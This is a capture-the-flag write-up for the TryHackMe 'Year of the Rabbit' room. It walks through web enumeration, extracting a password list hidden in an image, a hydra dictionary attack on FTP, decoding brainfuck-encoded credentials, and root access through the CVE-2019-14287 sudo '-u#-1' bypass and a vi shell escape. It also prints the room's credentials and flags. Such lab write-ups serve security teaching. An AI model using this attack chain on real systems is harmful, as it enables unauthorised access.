| Category          | Details                                                               |
|-------------------|-----------------------------------------------------------------------|
| 📝 **Name**       | [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)      |  
| 🏷 **Type**       | THM Challenge                                                         |
| 🖥 **OS**         | Linux                                                                 |
| 🎯 **Difficulty** | Easy                                                                  |
| 📁 **Tags**       | Web enumeration, Steganograpy, hydra, brainfuck, sudo, CVE-2019-14287 |

##  Task 1: Flags

### What is the user flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 09:07 +0100
Nmap scan report for 10.80.133.56
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.03 seconds
```

#### Enumerate assets
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ curl http://$TARGET/assets/style.css 
<SNIP>
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
<SNIP>
```
We have found hidden endpoint in comment in `style.css`

#### Access `/sup3r_s3cr3t_fl4g.php`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ curl -L -v http://$TARGET/sup3r_s3cr3t_fl4g.php
*   Trying 10.80.133.56:80...
* Connected to 10.80.133.56 (10.80.133.56) port 80
* using HTTP/1.x
> GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
> Host: 10.80.133.56
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Thu, 08 Jan 2026 09:56:38 GMT
< Server: Apache/2.4.10 (Debian)
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
* Ignoring the response-body
* setting size while ignoring
< 
* Connection #0 to host 10.80.133.56 left intact
* Issue another request to this URL: 'http://10.80.133.56/intermediary.php?hidden_directory=/WExYY2Cv-qU'
* Re-using existing http: connection with host 10.80.133.56
> GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
> Host: 10.80.133.56
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Thu, 08 Jan 2026 09:56:38 GMT
< Server: Apache/2.4.10 (Debian)
< location: /sup3r_s3cret_fl4g
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
* Ignoring the response-body
* setting size while ignoring
< 
* Connection #0 to host 10.80.133.56 left intact
* Issue another request to this URL: 'http://10.80.133.56/sup3r_s3cret_fl4g'
* Re-using existing http: connection with host 10.80.133.56
> GET /sup3r_s3cret_fl4g HTTP/1.1
> Host: 10.80.133.56
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Date: Thu, 08 Jan 2026 09:56:38 GMT
< Server: Apache/2.4.10 (Debian)
< Location: http://10.80.133.56/sup3r_s3cret_fl4g/
< Content-Length: 326
< Content-Type: text/html; charset=iso-8859-1
* Ignoring the response-body
* setting size while ignoring
< 
* Connection #0 to host 10.80.133.56 left intact
* Issue another request to this URL: 'http://10.80.133.56/sup3r_s3cret_fl4g/'
* Re-using existing http: connection with host 10.80.133.56
> GET /sup3r_s3cret_fl4g/ HTTP/1.1
> Host: 10.80.133.56
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 08 Jan 2026 09:56:39 GMT
< Server: Apache/2.4.10 (Debian)
< Last-Modified: Thu, 23 Jan 2020 00:34:26 GMT
< ETag: "263-59cc3cda20344"
< Accept-Ranges: bytes
< Content-Length: 611
< Vary: Accept-Encoding
< Content-Type: text/html
< 
<html>
        <head>
                <title>sup3r_s3cr3t_fl4g</title>
        </head>
        <body>
                <noscript>Love it when people block Javascript...<br></noscript>
                <noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
                <script>
                        alert("Word of advice... Turn off your javascript...");
                        window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
                </script>
                <video controls>
                        <source src="/assets/RickRolled.mp4" type="video/mp4">
                </video>
        </body>
</html>
* Connection #0 to host 10.80.133.56 left intact
```
When accessing `/sup3r_s3cr3t_fl4g.php` we are redirected multiple times. `/intermediary.php?hidden_directory=/WExYY2Cv-qU` redirection is particularly interesting, as it contains some hidden directory.

#### Access `/WExYY2Cv-qU/ `
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ curl http://$TARGET/WExYY2Cv-qU/                    
<SNIP>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="Hot_Babe.png">Hot_Babe.png</a></td>
<SNIP>
```
This Directory has listing enabled it shows single .png file  

#### Download `Hot_Babe.png`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ wget -q http://$TARGET/WExYY2Cv-qU/Hot_Babe.png
```

#### Look for hidden data with `zsteg`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ ~/Tools/zsteg/bin/zsteg -s all Hot_Babe.png
[?] 1244 bytes of extra data after image end (IEND), offset = 0x73ae7
extradata:0         .. text: "Ot9RrG7h2~24?\nEh, you've earned this. Username for FTP is ftpuser\nOne of these is the password:\nMou+56n%QK8sr\n1618B0AUshw1M\nA56IpIl%1s02u\nvTFbDzX9&Nmu?\nFfF~sfu^UQZmT\n8FF?iKO27b~V0\nua4W~2-@y7dE$\n3j39aMQQ7xFXT\nWb4--CTc4ww*-\nu6oY9?nHv84D&\n0iBp4W69Gr_Yf\nTS*%miyPsGV54\nC77O3FIy0c0sd\nO14xEhgg0Hxz1\n5dpv#Pr$wqH7F\n1G8Ucoce1+gS5\n0plnI%f0~Jw71\n0kLoLzfhqq8u&\nkS9pn5yiFGj6d\nzeff4#!b5Ib_n\nrNT4E4SHDGBkl\nKKH5zy23+S0@B\n3r6PHtM4NzJjE\ngm0!!EC1A0I2?\nHPHr!j00RaDEi\n7N+J9BYSp4uaY\nPYKt-ebvtmWoC\n3TN%cD_E6zm*s\neo?@c!ly3&=0Z\nnR8&FXz$ZPelN\neE4Mu53UkKHx#\n86?004F9!o49d\nSNGY0JjA5@0EE\ntrm64++JZ7R6E\n3zJuGL~8KmiK^\nCR-ItthsH%9du\nyP9kft386bB8G\nA-*eE3L@!4W5o\nGoM^$82l&GA5D\n1t$4$g$I+V_BH\n0XxpTd90Vt8OL\nj0CN?Z#8Bp69_\nG#h~9@5E5QA5l\nDRWNM7auXF7@j\nFw!if_=kk7Oqz\n92d5r$uyw!vaE\nc-AA7a2u!W2*?\nzy8z3kBi#2e36\nJ5%2Hn+7I6QLt\ngL$2fmgnq8vI*\nEtb?i?Kj4R=QM\n7CabD7kwY7=ri\n4uaIRX~-cY6K4\nkY1oxscv4EB2d\nk32?3^x1ex7#o\nep4IPQ_=ku@V8\ntQxFJ909rd1y2\n5L6kpPR5E2Msn\n65NX66Wv~oFP2\nLRAQ@zcBphn!1\nV4bt3*58Z32Xe\nki^t!+uqB?DyI\n5iez1wGXKfPKQ\nnJ90XzX&AnF5v\n7EiMd5!r%=18c\nwYyx6Eq-T^9\#@\nyT2o$2exo~UdW\nZuI-8!JyI6iRS\nPTKM6RsLWZ1&^\n3O$oC~%XUlRO@\nKW3fjzWpUGHSW\nnTzl5f=9eS&*W\nWS9x0ZF=x1%8z\nSr4*E4NT5fOhS\nhLR3xQV*gHYuC\n4P3QgF5kflszS\nNIZ2D%d58*v@R\n0rJ7p%6Axm05K\n94rU30Zx45z5c\nVi^Qf+u%0*q_S\n1Fvdp&bNl3#&l\nzLH%Ot0Bw&c%9\n"
imagedata           .. text: "*>7%OF\" "
chunk:0:IHDR        .. file: Lotus unknown worksheet or configuration, revision 0
b2,rgb,lsb,xy       .. file: OpenPGP Secret Key
b2,bgr,msb,xy       .. file: OpenPGP Public Key
b3,r,msb,xy         .. text: "@OXa|j1F"
b3,b,msb,xy         .. text: "e0\n5@m0gMm"
b3,bgr,lsb,xy       .. text: "'{Y)(p9ot"
b4,g,lsb,xy         .. file: OpenPGP Public Key
b4,g,msb,xy         .. file: OpenPGP Public Key
b4,rgb,msb,xy       .. file: OpenPGP Secret Key
b4,bgr,msb,xy       .. file: OpenPGP Public Key
```
We have found message containing list of potential passwords for user `ftpuser`. 

#### Extract passwords from `Hot_Babe.png` image
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ ~/Tools/zsteg/bin/zsteg -E extradata:0 Hot_Babe.png > passwords.txt
```

#### Conduct dictionary attack over FTP against user `ftpuser` using `passwords.txt` dictionary
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ hydra -l ftpuser -P passwords.txt ftp://$TARGET                    
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-08 12:27:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 85 login tries (l:1/p:85), ~6 tries per task
[DATA] attacking ftp://10.80.133.56:21/
[21][ftp] host: 10.80.133.56   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-08 12:28:11
```

#### Enumerate FTP using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ ftp ftpuser@$TARGET                                                                                                                                
Connected to 10.80.133.56.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7163|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||53309|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |*******************************************************************************************************************************************************|   758      585.16 KiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (17.19 KiB/s)
ftp> exit
221 Goodbye.
```

#### Read exfiltrated `Eli's_Creds.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
This file looks like encoded with `brainfuck`.

#### Decode `Eli's_Creds.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ python3 - << 'EOF'
code=open("Eli's_Creds.txt").read()
t=[0]*30000;p=i=0;stack=[]
while i<len(code):
    c=code[i]    
    if c=='>': p+=1
    elif c=='<': p-=1
    elif c=='+': t[p]=(t[p]+1)%256
    elif c=='-': t[p]=(t[p]-1)%256
    elif c=='.': print(chr(t[p]),end='')
    elif c=='[': stack.append(i)
    elif c==']': i=stack.pop()-1 if t[p]!=0 else i
    i+=1
EOF

User: eli
Password: DSpDiM1wAEwid
```
We were able to decode yet another set of credentials.

#### Access target over SSH using credentials for user `eli`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ ssh eli@$TARGET    
eli@10.80.133.56's password: 
<SNIP>
1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
<SNIP>
eli@year-of-the-rabbit:~$ id
uid=1000(eli) gid=1000(eli) groups=1000(eli),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),119(bluetooth)
eli@year-of-the-rabbit:~$ 
```
We can see that `root` has left some secret message for user `gwendoline`.

#### Access 'secret' message left for user `gwendoline`
File has been found with `linepeas`.
```
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

#### Access target over SSH using credentials for user `gwendoline`
```
┌──(magicrc㉿perun)-[~/attack/THM Year of the Rabbit]
└─$ ssh gwendoline@$TARGET
<SNIP>
gwendoline@year-of-the-rabbit:~$ id
uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
```

#### Capture user flag
```
gwendoline@year-of-the-rabbit:~$ cat /home/gwendoline/user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

### What is the root flag?

#### List allowed sudo commands
```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
There is `vi` on the list, which could be easily used to spawn shell, however `root` is excluded from the users list. According to [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) in `sudo` before 1.8.28 version `!root` configuration could be bypassed by specifying `#-1` as user.  
 
#### Check `sudo` version
```
gwendoline@year-of-the-rabbit:~$ sudo -V
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```
It seems to be vulnerable.

#### Bypass `!root` sudo configuration
```
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

#### Spawn shell from within `vi`
```
:!/bin/sh
```
```
# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
# cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
